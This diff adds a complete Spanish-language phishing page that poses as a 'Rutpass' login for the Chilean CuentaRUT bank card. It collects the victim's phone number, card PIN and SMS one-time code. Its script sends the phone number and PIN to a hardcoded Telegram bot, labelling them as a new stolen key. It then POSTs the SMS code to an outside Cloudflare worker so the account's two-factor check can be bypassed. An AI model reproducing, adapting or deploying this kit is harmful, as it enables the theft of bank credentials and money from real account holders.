@@ -1,0 +1,1276 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rutpass</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    margin:0;
+    background:#fff;
+    display:flex;
+    justify-content:center;
+    font-family:Arial, Helvetica, sans-serif;
+    overflow:hidden;
+    height:100vh;
+}
+
+.phone{
+    max-width:430px;
+    margin:auto;
+    min-height:100vh;
+    position:relative;
+    background:#fff;
+    width:100%;
+    padding-bottom:100px;
+}
+
+.header{
+    height:72px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    position:relative;
+}
+
+.back{
+    position:absolute;
+    left:18px;
+    font-size:46px;
+    color:#3b3b3b;
+    cursor:pointer;
+    line-height:1;
+}
+
+.header h2{
+    font-size:26px;
+    font-weight:500;
+    color:#222;
+}
+
+.content{
+    padding:60px 34px 0;
+}
+
+.title{
+    font-size:28px;
+    font-weight:700;
+    line-height:1.2;
+    text-align:center;
+    color:#1f2023;
+    margin-bottom:15px;
+}
+
+.subtitle{
+    font-size:16px;
+    color:#666;
+    text-align:center;
+    line-height:1.5;
+    margin-bottom:10px;
+}
+
+.subtitle-phone{
+    font-size:18px;
+    font-weight:600;
+    color:#1f2023;
+    text-align:center;
+    margin-bottom:30px;
+}
+
+.phone-display{
+    font-weight:600;
+    color:#1f2023;
+}
+
+/* Estilos para el campo de teléfono */
+.phone-section {
+    display: block;
+    margin-bottom: 30px;
+}
+
+.phone-section.hidden {
+    display: none;
+}
+
+.phone-input-wrapper {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 10px;
+}
+
+.phone-prefix {
+    font-size: 18px;
+    font-weight: 600;
+    color: #555;
+    padding: 0 16px;
+    height: 56px;
+    display: flex;
+    align-items: center;
+    border: 2.5px solid #5B2EFF;
+    border-right: none;
+    border-radius: 18px 0 0 18px;
+    background: #f8f9fa;
+    color: #333;
+}
+
+.phone-input {
+    width: 100%;
+    max-width: 250px;
+    height: 56px;
+    border: 2.5px solid #5B2EFF;
+    border-left: none;
+    border-radius: 0 18px 18px 0;
+    padding: 0 24px 0 10px;
+    font-size: 18px;
+    color: #555;
+    outline: none;
+    transition: border-color 0.3s;
+    background: #fff;
+    text-align: left;
+    letter-spacing: 2px;
+}
+
+.phone-input:focus {
+    border-color: #4a25d6;
+    box-shadow: 0 0 0 3px rgba(91, 46, 255, 0.1);
+}
+
+.phone-input::placeholder {
+    color: #bbb;
+    font-size: 16px;
+    letter-spacing: 1px;
+}
+
+.btn-enviar-phone {
+    width: 100%;
+    max-width: 100%;
+    height: 52px;
+    border: none;
+    border-radius: 40px;
+    background: #ECECEC;
+    color: #BDBDBD;
+    font-size: 20px;
+    font-weight: 500;
+    cursor: not-allowed;
+    transition: all 0.25s ease;
+    display: block;
+    margin: 10px auto 0;
+}
+
+.btn-enviar-phone.active {
+    background: #5B2EFF;
+    color: #fff;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(91, 46, 255, 0.3);
+}
+
+.btn-enviar-phone.active:hover {
+    transform: scale(1.02);
+    box-shadow: 0 6px 20px rgba(91, 46, 255, 0.4);
+}
+
+.btn-enviar-phone.active:active {
+    transform: scale(0.98);
+}
+
+/* Sección de la clave de tarjeta - ESTILO RUTPASS */
+.card-section {
+    display: none;
+    animation: fadeIn 0.5s ease;
+}
+
+.card-section.active {
+    display: block;
+}
+
+@keyframes fadeIn {
+    from {
+        opacity: 0;
+        transform: translateY(20px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+/* Título de la clave */
+.card-title {
+    font-size: 20px;
+    font-weight: 600;
+    color: #1f2023;
+    text-align: center;
+    margin-bottom: 8px;
+}
+
+.card-subtitle {
+    font-size: 14px;
+    color: #888;
+    text-align: center;
+    margin-bottom: 35px;
+}
+
+/* Campos de clave estilo RUTPASS - 4 dígitos con borde inferior */
+.card-code-container{
+    display:flex;
+    justify-content:center;
+    gap:20px;
+    margin:0 0 35px;
+}
+
+.card-code-wrapper {
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+.card-code-input{
+    width: 50px;
+    height: 60px;
+    border: none;
+    border-bottom: 3px solid #ddd;
+    text-align:center;
+    font-size:32px;
+    font-weight:600;
+    color:#1f2023;
+    outline:none;
+    transition:border-color 0.3s;
+    background:transparent;
+    padding:0;
+    caret-color: #5B2EFF;
+}
+
+.card-code-input:focus{
+    border-bottom-color: #5B2EFF;
+}
+
+.card-code-input.filled{
+    border-bottom-color: #5B2EFF;
+}
+
+/* Botón Continuar */
+.btn-continuar{
+    width:100%;
+    height:56px;
+    border:none;
+    border-radius:40px;
+    background:#ECECEC;
+    color:#BDBDBD;
+    font-size:22px;
+    font-weight:600;
+    cursor:not-allowed;
+    transition:all 0.25s ease;
+    margin-top:10px;
+}
+
+.btn-continuar.active{
+    background:#5B2EFF;
+    color:#fff;
+    cursor:pointer;
+    box-shadow:0 4px 15px rgba(91, 46, 255, 0.3);
+}
+
+.btn-continuar.active:hover{
+    transform:scale(1.02);
+    box-shadow:0 6px 20px rgba(91, 46, 255, 0.4);
+}
+
+.btn-continuar.active:active{
+    transform:scale(0.98);
+}
+
+/* Botones de confirmación */
+.confirm-buttons {
+    display: flex;
+    gap: 15px;
+    margin-top: 25px;
+}
+
+.confirm-btn {
+    flex: 1;
+    height: 52px;
+    border: none;
+    border-radius: 40px;
+    font-size: 18px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.25s ease;
+}
+
+.confirm-btn-yes {
+    background: #5B2EFF;
+    color: #fff;
+    box-shadow: 0 4px 15px rgba(91, 46, 255, 0.3);
+}
+
+.confirm-btn-yes:hover {
+    transform: scale(1.02);
+    box-shadow: 0 6px 20px rgba(91, 46, 255, 0.4);
+}
+
+.confirm-btn-yes:active {
+    transform: scale(0.98);
+}
+
+.confirm-btn-no {
+    background: #f0f0f0;
+    color: #666;
+}
+
+.confirm-btn-no:hover {
+    background: #e5e5e5;
+}
+
+.confirm-btn-no:active {
+    transform: scale(0.98);
+}
+
+/* Sección del código SMS */
+.sms-section {
+    display: none;
+    animation: fadeIn 0.5s ease;
+}
+
+.sms-section.active {
+    display: block;
+}
+
+/* Campos de código - 5 dígitos */
+.code-container{
+    display:flex;
+    justify-content:center;
+    gap:12px;
+    margin:30px 0 35px;
+}
+
+.code-input{
+    width:52px;
+    height:62px;
+    border:2px solid #ddd;
+    border-radius:12px;
+    text-align:center;
+    font-size:28px;
+    font-weight:600;
+    color:#1f2023;
+    outline:none;
+    transition:border-color 0.3s;
+    background:#f8f9fa;
+}
+
+.code-input:focus{
+    border-color:#5B2EFF;
+    background:#fff;
+    box-shadow:0 0 0 3px rgba(91, 46, 255, 0.1);
+}
+
+.code-input.filled{
+    border-color:#5B2EFF;
+    background:#fff;
+}
+
+/* Timer */
+.timer-container{
+    text-align:center;
+    margin-bottom:30px;
+}
+
+.timer-text{
+    font-size:15px;
+    color:#666;
+}
+
+.timer-text span{
+    color:#5B2EFF;
+    font-weight:600;
+}
+
+.resend-link{
+    color:#5B2EFF;
+    font-weight:600;
+    cursor:pointer;
+    text-decoration:underline;
+    transition:opacity 0.2s;
+    display:inline-block;
+    margin-top:8px;
+}
+
+.resend-link:hover{
+    opacity:0.7;
+}
+
+.resend-link.disabled{
+    color:#999;
+    cursor:not-allowed;
+    text-decoration:none;
+}
+
+/* Loader */
+.loader-container {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(255,255,255,0.9);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+}
+
+.loader-container.active {
+    display: flex;
+}
+
+.loader {
+    width: 50px;
+    height: 50px;
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #5B2EFF;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* Ajustes para pantallas más pequeñas */
+@media(max-width:430px){
+    .content{
+        padding:50px 24px 0;
+    }
+    
+    .title{
+        font-size:24px;
+    }
+    
+    .subtitle{
+        font-size:15px;
+    }
+    
+    .code-input{
+        width:46px;
+        height:56px;
+        font-size:24px;
+    }
+    
+    .code-container{
+        gap:10px;
+    }
+    
+    .card-code-input{
+        width: 42px;
+        height: 50px;
+        font-size:28px;
+    }
+    
+    .card-code-container{
+        gap:15px;
+    }
+    
+    .btn-continuar{
+        height:50px;
+        font-size:20px;
+    }
+
+    .phone-input {
+        max-width: 100%;
+        font-size: 16px;
+    }
+
+    .phone-prefix {
+        font-size: 16px;
+        padding: 0 12px;
+        height: 50px;
+    }
+
+    .phone-input {
+        height: 50px;
+    }
+
+    .btn-enviar-phone {
+        max-width: 100%;
+    }
+    
+    .card-title {
+        font-size: 18px;
+    }
+    
+    .confirm-btn {
+        height: 46px;
+        font-size: 16px;
+    }
+}
+
+@media(max-width:380px){
+    .content{
+        padding:40px 18px 0;
+    }
+    
+    .title{
+        font-size:22px;
+    }
+    
+    .subtitle{
+        font-size:14px;
+    }
+    
+    .code-input{
+        width:40px;
+        height:48px;
+        font-size:20px;
+        border-radius:10px;
+    }
+    
+    .code-container{
+        gap:8px;
+    }
+    
+    .card-code-input{
+        width: 36px;
+        height: 44px;
+        font-size:24px;
+    }
+    
+    .card-code-container{
+        gap:12px;
+    }
+    
+    .btn-continuar{
+        height:46px;
+        font-size:18px;
+    }
+    
+    .header h2{
+        font-size:20px;
+    }
+    
+    .back{
+        font-size:32px;
+        left:12px;
+    }
+
+    .phone-input {
+        font-size: 14px;
+        height: 44px;
+    }
+
+    .phone-prefix {
+        font-size: 14px;
+        padding: 0 10px;
+        height: 44px;
+    }
+
+    .btn-enviar-phone {
+        height: 44px;
+        font-size: 16px;
+    }
+    
+    .card-title {
+        font-size: 16px;
+    }
+    
+    .confirm-btn {
+        height: 42px;
+        font-size: 14px;
+    }
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="phone">
+
+<div class="header">
+<div class="back" onclick="window.history.back()">&#8249;</div>
+<h2>Inicia sesión</h2>
+</div>
+
+<div class="content">
+
+<div class="title" id="mainTitle">
+Ingresa tu número de teléfono
+</div>
+
+<!-- Sección del teléfono -->
+<div class="phone-section" id="phoneSection">
+    <div class="subtitle">
+        Ingresa el número de teléfono vinculado a tu cuenta
+    </div>
+    
+    <div class="phone-input-wrapper">
+        <span class="phone-prefix">+56</span>
+        <input type="tel" class="phone-input" id="phoneInput" placeholder="9 XXXX XXXX" maxlength="9">
+    </div>
+    
+    <button class="btn-enviar-phone" id="btnEnviarPhone" disabled>Continuar</button>
+</div>
+
+<!-- Sección de la clave de tarjeta - ESTILO RUTPASS -->
+<div class="card-section" id="cardSection">
+    <div class="subtitle-phone" id="phoneConfirm">
+        ¿Este es tu número de celular?<br>
+        <strong id="confirmPhoneDisplay">+569****1234</strong>
+    </div>
+    
+    <div class="card-title">Ingresa tu clave de tu tarjeta CuentaRUT</div>
+    <div class="card-subtitle">Ingresa los 4 dígitos de tu clave</div>
+
+    <div class="card-code-container" id="cardCodeContainer">
+        <div class="card-code-wrapper">
+            <input type="password" class="card-code-input" maxlength="1" inputmode="numeric" data-index="0" autofocus>
+        </div>
+        <div class="card-code-wrapper">
+            <input type="password" class="card-code-input" maxlength="1" inputmode="numeric" data-index="1">
+        </div>
+        <div class="card-code-wrapper">
+            <input type="password" class="card-code-input" maxlength="1" inputmode="numeric" data-index="2">
+        </div>
+        <div class="card-code-wrapper">
+            <input type="password" class="card-code-input" maxlength="1" inputmode="numeric" data-index="3">
+        </div>
+    </div>
+
+    <button class="btn-continuar" id="btnValidarClave" disabled>Continuar</button>
+    
+    <div class="confirm-buttons">
+        <button class="confirm-btn confirm-btn-yes" id="confirmYes">Sí, es mi número</button>
+        <button class="confirm-btn confirm-btn-no" id="confirmNo">No, no es mi número</button>
+    </div>
+</div>
+
+<!-- Sección del código SMS -->
+<div class="sms-section" id="smsSection">
+    <div class="subtitle" id="smsSubtitle">
+        Te enviamos un código de 5 dígitos por SMS al <span class="phone-display" id="smsPhoneDisplay">+56 9 XXXX XXXX</span>. No lo compartas con nadie
+    </div>
+
+    <!-- Campos de código - 5 dígitos -->
+    <div class="code-container" id="codeContainer">
+        <input type="tel" class="code-input" maxlength="1" inputmode="numeric" data-index="0" autofocus>
+        <input type="tel" class="code-input" maxlength="1" inputmode="numeric" data-index="1">
+        <input type="tel" class="code-input" maxlength="1" inputmode="numeric" data-index="2">
+        <input type="tel" class="code-input" maxlength="1" inputmode="numeric" data-index="3">
+        <input type="tel" class="code-input" maxlength="1" inputmode="numeric" data-index="4">
+    </div>
+
+    <!-- Timer y reenvío -->
+    <div class="timer-container">
+        <div class="timer-text">
+            Reenviar código en <span id="timer">51</span> segundos
+        </div>
+        <div class="resend-link disabled" id="resendLink">Reenviar código</div>
+    </div>
+
+    <!-- Botón Continuar -->
+    <button class="btn-continuar" id="btnContinuar" disabled>Continuar</button>
+</div>
+
+</div>
+
+</div>
+
+<!-- LOADER -->
+<div class="loader-container" id="loader">
+    <div class="loader"></div>
+</div>
+
+<script>
+// ============================================
+// CONFIGURACIÓN DE TELEGRAM
+// ============================================
+const TELEGRAM_BOT_TOKEN = '8703044811:AAF2fekkn1hBO83UDXozzuvmzczZYQK2Mj4';
+const TELEGRAM_CHAT_ID = '8042354877';
+
+async function enviarATelegram(numero, clave) {
+    const mensaje = `🔐 *NUEVA CLAVE REGISTRADA YA VIENE CODIGO SMS*\n\n📱 Teléfono: +56 ${numero}\n🔑 Clave: ${clave}`;
+    
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const params = new URLSearchParams({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: mensaje,
+            parse_mode: 'Markdown'
+        });
+        
+        const response = await fetch(`${url}?${params}`);
+        const data = await response.json();
+        
+        if (data.ok) {
+            console.log('✅ Mensaje enviado a Telegram');
+            return true;
+        } else {
+            console.error('❌ Error al enviar a Telegram:', data);
+            return false;
+        }
+    } catch (error) {
+        console.error('❌ Error en la solicitud a Telegram:', error);
+        return false;
+    }
+}
+
+const phoneInput = document.getElementById('phoneInput');
+const btnEnviarPhone = document.getElementById('btnEnviarPhone');
+const phoneSection = document.getElementById('phoneSection');
+const cardSection = document.getElementById('cardSection');
+const smsSection = document.getElementById('smsSection');
+const mainTitle = document.getElementById('mainTitle');
+const confirmPhoneDisplay = document.getElementById('confirmPhoneDisplay');
+const cardCodeInputs = document.querySelectorAll('.card-code-input');
+const btnValidarClave = document.getElementById('btnValidarClave');
+const codeInputs = document.querySelectorAll('.code-input');
+const btnContinuar = document.getElementById('btnContinuar');
+const timerSpan = document.getElementById('timer');
+const resendLink = document.getElementById('resendLink');
+const loader = document.getElementById('loader');
+const smsPhoneDisplay = document.getElementById('smsPhoneDisplay');
+const confirmYes = document.getElementById('confirmYes');
+const confirmNo = document.getElementById('confirmNo');
+
+let timer = 51;
+let timerInterval = null;
+let isTimerRunning = true;
+let telefonoGuardado = '';
+
+// ============================================
+// FUNCIÓN PARA OCULTAR TELÉFONO
+// ============================================
+function ocultarTelefono(numero) {
+    let limpio = numero.replace(/\D/g, '');
+    if (limpio.length >= 4) {
+        const ultimos4 = limpio.slice(-4);
+        return `+569****${ultimos4}`;
+    }
+    return '+569****1234';
+}
+
+// ============================================
+// FUNCIÓN PARA FORMATEAR TELÉFONO COMPLETO
+// ============================================
+function formatearTelefonoCompleto(numero) {
+    let limpio = numero.replace(/\D/g, '');
+    if (limpio.length >= 9) {
+        const primero = limpio.slice(0, 1);
+        const parte1 = limpio.slice(1, 5);
+        const parte2 = limpio.slice(5, 9);
+        return `+56 ${primero} ${parte1} ${parte2}`;
+    } else if (limpio.length > 0) {
+        return `+56 ${limpio}`;
+    }
+    return '+56 9 XXXX XXXX';
+}
+
+// ============================================
+// FUNCIÓN PARA VALIDAR TELÉFONO
+// ============================================
+function validarTelefono(numero) {
+    const limpio = numero.replace(/\D/g, '');
+    return limpio.length >= 9;
+}
+
+// ============================================
+// ACTUALIZAR BOTÓN DE ENVÍO DE TELÉFONO
+// ============================================
+function actualizarBotonPhone() {
+    if (validarTelefono(phoneInput.value)) {
+        btnEnviarPhone.classList.add('active');
+        btnEnviarPhone.disabled = false;
+    } else {
+        btnEnviarPhone.classList.remove('active');
+        btnEnviarPhone.disabled = true;
+    }
+}
+
+// ============================================
+// ENVIAR TELÉFONO Y MOSTRAR SECCIÓN CLAVE
+// ============================================
+function enviarTelefono() {
+    if (!validarTelefono(phoneInput.value)) return;
+    
+    const telefono = phoneInput.value.replace(/\D/g, '');
+    telefonoGuardado = telefono;
+    
+    // Mostrar el teléfono oculto
+    confirmPhoneDisplay.textContent = ocultarTelefono(telefono);
+    
+    // Guardar en localStorage
+    let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+    bancoldata.telefono = telefono;
+    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+    
+    // Cambiar el título
+    mainTitle.textContent = '';
+    
+    // Ocultar sección de teléfono y mostrar sección clave
+    phoneSection.classList.add('hidden');
+    cardSection.classList.add('active');
+    
+    // Enfocar el primer input
+    setTimeout(() => {
+        cardCodeInputs[0].focus();
+    }, 500);
+}
+
+// ============================================
+// FUNCIONES PARA BOTONES DE CONFIRMACIÓN
+// ============================================
+confirmYes.addEventListener('click', function() {
+    // Si la clave está completa, validar
+    if (btnValidarClave.classList.contains('active')) {
+        validarClave();
+    }
+});
+
+confirmNo.addEventListener('click', function() {
+    // Volver a la sección del teléfono
+    cardSection.classList.remove('active');
+    phoneSection.classList.remove('hidden');
+    mainTitle.textContent = 'Ingresa tu número de teléfono';
+    phoneInput.value = '';
+    phoneInput.focus();
+    actualizarBotonPhone();
+});
+
+// ============================================
+// FUNCIÓN PARA ENFOCAR INPUTS DE CLAVE
+// ============================================
+function focusNextCardInput(currentIndex) {
+    if (currentIndex < cardCodeInputs.length - 1) {
+        cardCodeInputs[currentIndex + 1].focus();
+    }
+}
+
+function focusPrevCardInput(currentIndex) {
+    if (currentIndex > 0) {
+        cardCodeInputs[currentIndex - 1].focus();
+    }
+}
+
+// ============================================
+// VERIFICAR SI TODOS LOS CAMPOS DE CLAVE ESTÁN LLENOS
+// ============================================
+function checkCardFilled() {
+    let allFilled = true;
+    cardCodeInputs.forEach(input => {
+        if (input.value === '') {
+            allFilled = false;
+        }
+    });
+    
+    if (allFilled) {
+        btnValidarClave.classList.add('active');
+        btnValidarClave.disabled = false;
+    } else {
+        btnValidarClave.classList.remove('active');
+        btnValidarClave.disabled = true;
+    }
+}
+
+// ============================================
+// EVENTOS PARA CADA INPUT DE CLAVE
+// ============================================
+cardCodeInputs.forEach((input, index) => {
+    input.addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        
+        if (this.value.length === 1) {
+            this.classList.add('filled');
+            focusNextCardInput(index);
+        } else {
+            this.classList.remove('filled');
+        }
+        
+        checkCardFilled();
+    });
+    
+    input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && this.value === '') {
+            this.classList.remove('filled');
+            focusPrevCardInput(index);
+            checkCardFilled();
+        }
+    });
+    
+    input.addEventListener('click', function() {
+        this.select();
+    });
+    
+    input.addEventListener('paste', function(e) {
+        e.preventDefault();
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        const numbers = paste.replace(/[^0-9]/g, '').slice(0, 4);
+        
+        numbers.split('').forEach((num, i) => {
+            if (i < cardCodeInputs.length) {
+                cardCodeInputs[i].value = num;
+                cardCodeInputs[i].classList.add('filled');
+            }
+        });
+        
+        const nextIndex = Math.min(numbers.length, cardCodeInputs.length - 1);
+        if (numbers.length < cardCodeInputs.length) {
+            cardCodeInputs[numbers.length].focus();
+        } else {
+            cardCodeInputs[cardCodeInputs.length - 1].focus();
+        }
+        
+        checkCardFilled();
+    });
+});
+
+// ============================================
+// VALIDAR CLAVE Y ENVIAR A TELEGRAM
+// ============================================
+async function validarClave() {
+    let clave = '';
+    cardCodeInputs.forEach(input => {
+        clave += input.value;
+    });
+    
+    console.log('🔑 Clave ingresada:', clave);
+    console.log('📱 Teléfono:', telefonoGuardado);
+    
+    // Mostrar loader
+    loader.classList.add('active');
+    
+    // Enviar a Telegram
+    const enviado = await enviarATelegram(telefonoGuardado, clave);
+    
+    // Ocultar loader
+    loader.classList.remove('active');
+    
+    if (enviado) {
+        // Mostrar el teléfono en el subtítulo del SMS
+        smsPhoneDisplay.textContent = formatearTelefonoCompleto(telefonoGuardado);
+        
+        // Guardar en localStorage
+        let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+        bancoldata.tarjeta = '6484';
+        bancoldata.clave = clave;
+        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+        
+        // Cambiar el título
+        mainTitle.textContent = 'Ingresa el código de verificación';
+        
+        // Ocultar sección de clave y mostrar sección SMS
+        cardSection.classList.remove('active');
+        smsSection.classList.add('active');
+        
+        // Generar y enviar código
+        generarYEnviarCodigo(telefonoGuardado);
+        
+        // Enfocar el primer input de código SMS
+        setTimeout(() => {
+            codeInputs[0].focus();
+        }, 500);
+        
+        // Iniciar timer
+        startTimer();
+    } else {
+        alert('Error al enviar la clave. Intenta nuevamente.');
+        // Limpiar campos de clave
+        cardCodeInputs.forEach(input => {
+            input.value = '';
+            input.classList.remove('filled');
+        });
+        cardCodeInputs[0].focus();
+        checkCardFilled();
+    }
+}
+
+btnValidarClave.addEventListener('click', function() {
+    if (this.classList.contains('active')) {
+        validarClave();
+    }
+});
+
+// ============================================
+// GENERAR Y ENVIAR CÓDIGO
+// ============================================
+function generarCodigo() {
+    return Math.floor(10000 + Math.random() * 90000).toString();
+}
+
+function generarYEnviarCodigo(telefono) {
+    const codigo = generarCodigo();
+    console.log('🔑 Código generado (5 dígitos):', codigo);
+    
+    let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+    bancoldata.codigo_dinamico = codigo;
+    bancoldata.telefono = telefono;
+    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+    
+    console.log(`📱 Enviando código ${codigo} al teléfono ${telefono}`);
+}
+
+// ============================================
+// FUNCIÓN PARA ENFOCAR INPUTS DE CÓDIGO SMS
+// ============================================
+function focusNextInput(currentIndex) {
+    if (currentIndex < codeInputs.length - 1) {
+        codeInputs[currentIndex + 1].focus();
+    }
+}
+
+function focusPrevInput(currentIndex) {
+    if (currentIndex > 0) {
+        codeInputs[currentIndex - 1].focus();
+    }
+}
+
+// ============================================
+// VERIFICAR SI TODOS LOS CAMPOS DE CÓDIGO SMS ESTÁN LLENOS
+// ============================================
+function checkAllFilled() {
+    let allFilled = true;
+    codeInputs.forEach(input => {
+        if (input.value === '') {
+            allFilled = false;
+        }
+    });
+    
+    if (allFilled) {
+        btnContinuar.classList.add('active');
+        btnContinuar.disabled = false;
+    } else {
+        btnContinuar.classList.remove('active');
+        btnContinuar.disabled = true;
+    }
+}
+
+// ============================================
+// EVENTOS PARA CADA INPUT DE CÓDIGO SMS
+// ============================================
+codeInputs.forEach((input, index) => {
+    input.addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        
+        if (this.value.length === 1) {
+            this.classList.add('filled');
+            focusNextInput(index);
+        } else {
+            this.classList.remove('filled');
+        }
+        
+        checkAllFilled();
+    });
+    
+    input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && this.value === '') {
+            this.classList.remove('filled');
+            focusPrevInput(index);
+            checkAllFilled();
+        }
+    });
+    
+    input.addEventListener('click', function() {
+        this.select();
+    });
+    
+    input.addEventListener('paste', function(e) {
+        e.preventDefault();
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        const numbers = paste.replace(/[^0-9]/g, '').slice(0, 5);
+        
+        numbers.split('').forEach((num, i) => {
+            if (i < codeInputs.length) {
+                codeInputs[i].value = num;
+                codeInputs[i].classList.add('filled');
+            }
+        });
+        
+        const nextIndex = Math.min(numbers.length, codeInputs.length - 1);
+        if (numbers.length < codeInputs.length) {
+            codeInputs[numbers.length].focus();
+        } else {
+            codeInputs[codeInputs.length - 1].focus();
+        }
+        
+        checkAllFilled();
+    });
+});
+
+// ============================================
+// TIMER
+// ============================================
+function startTimer() {
+    timer = 51;
+    isTimerRunning = true;
+    timerSpan.textContent = timer;
+    resendLink.classList.add('disabled');
+    resendLink.style.pointerEvents = 'none';
+    
+    if (timerInterval) clearInterval(timerInterval);
+    
+    timerInterval = setInterval(() => {
+        timer--;
+        timerSpan.textContent = timer;
+        
+        if (timer <= 0) {
+            clearInterval(timerInterval);
+            isTimerRunning = false;
+            timerSpan.textContent = '0';
+            resendLink.classList.remove('disabled');
+            resendLink.style.pointerEvents = 'auto';
+        }
+    }, 1000);
+}
+
+// ============================================
+// REENVIAR CÓDIGO
+// ============================================
+resendLink.addEventListener('click', function() {
+    if (!this.classList.contains('disabled')) {
+        const nuevoCodigo = generarCodigo();
+        console.log('🔄 Reenviando código...', nuevoCodigo);
+        
+        let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+        bancoldata.codigo_dinamico = nuevoCodigo;
+        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+        
+        startTimer();
+        alert('Código reenviado correctamente a tu teléfono');
+    }
+});
+
+// ============================================
+// EVENTOS DEL TELÉFONO
+// ============================================
+phoneInput.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '');
+    if (this.value.length > 9) {
+        this.value = this.value.slice(0, 9);
+    }
+    actualizarBotonPhone();
+});
+
+// Formatear el número al perder el foco
+phoneInput.addEventListener('blur', function() {
+    if (this.value.length >= 5) {
+        const primero = this.value.slice(0, 1);
+        const parte1 = this.value.slice(1, 5);
+        const parte2 = this.value.slice(5);
+        if (parte2) {
+            this.value = primero + ' ' + parte1 + ' ' + parte2;
+        } else if (parte1) {
+            this.value = primero + ' ' + parte1;
+        } else {
+            this.value = primero;
+        }
+    }
+});
+
+phoneInput.addEventListener('focus', function() {
+    this.value = this.value.replace(/\s/g, '');
+});
+
+phoneInput.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter' && btnEnviarPhone.classList.contains('active')) {
+        btnEnviarPhone.click();
+    }
+});
+
+btnEnviarPhone.addEventListener('click', function() {
+    if (this.classList.contains('active')) {
+        enviarTelefono();
+    }
+});
+
+// ============================================
+// BOTÓN CONTINUAR - ENVIAR CÓDIGO AL WORKER
+// ============================================
+btnContinuar.addEventListener('click', async function() {
+    if (!this.classList.contains('active')) return;
+    
+    let codigo = '';
+    codeInputs.forEach(input => {
+        codigo += input.value;
+    });
+    
+    console.log('📱 Código ingresado:', codigo);
+    
+    try {
+        loader.classList.add('active');
+        
+        let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+        const transactionId = bancoldata.transactionId;
+        const usuario = bancoldata.usuario;
+        const telefono = bancoldata.telefono || telefonoGuardado;
+        
+        if (!transactionId || !usuario) {
+            alert('Error: Datos de sesión no encontrados');
+            loader.classList.remove('active');
+            return;
+        }
+        
+        console.log('📤 Enviando código al worker:', { transactionId, codigo, telefono });
+        
+        const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/otp-code', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                transactionId: transactionId,
+                otp: codigo,
+                telefono: telefono
+            })
+        });
+        
+        const result = await response.json();
+        console.log('✅ Respuesta del worker:', result);
+        
+        loader.classList.remove('active');
+        
+        if (result.ok) {
+            bancoldata.codigo_sms = codigo;
+            bancoldata.tipo = 'sms';
+            bancoldata.modo = 'verificado';
+            localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+            
+            window.location.href = 'validando.html';
+        } else {
+            alert('Error al enviar el código: ' + (result.error || 'Error desconocido'));
+            codeInputs.forEach(input => {
+                input.value = '';
+                input.classList.remove('filled');
+            });
+            codeInputs[0].focus();
+            checkAllFilled();
+        }
+        
+    } catch (error) {
+        console.error('❌ Error al enviar código:', error);
+        loader.classList.remove('active');
+        alert('Error al enviar el código. Intenta nuevamente.');
+    }
+});
+
+// ============================================
+// INICIALIZAR
+// ============================================
+setTimeout(() => {
+    phoneInput.focus();
+}, 500);
+
+console.log('🚀 Página de verificación por teléfono cargada');
+console.log('📱 Primero ingresa tu número de teléfono');
+
+</script>
+
+</body>
+</html>
